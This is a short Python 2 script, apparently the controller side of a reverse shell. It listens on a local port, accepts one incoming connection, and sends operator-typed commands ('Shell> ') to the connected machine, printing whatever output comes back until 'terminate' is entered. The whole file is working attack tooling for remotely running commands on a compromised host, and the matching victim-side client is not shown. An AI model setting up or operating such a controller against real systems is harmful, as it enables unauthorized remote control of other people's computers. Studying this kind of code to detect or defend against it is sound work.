import socket

server_ip = '127.0.0.1'
port = 8080

def connect():
    so = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    so.bind((server_ip, port))
    so.listen(1)
    print '[+] Listening incoming connections...'
    conn, addr = so.accept()
    print '[+] Connection from: ', addr

    while True:
        command = raw_input('Shell> ')
        if 'terminate' in command:
            conn.send('terminate')
            conn.close()
            break
        else:
            conn.send(command)
            print conn.recv(1024)

def main():
    connect()
main()
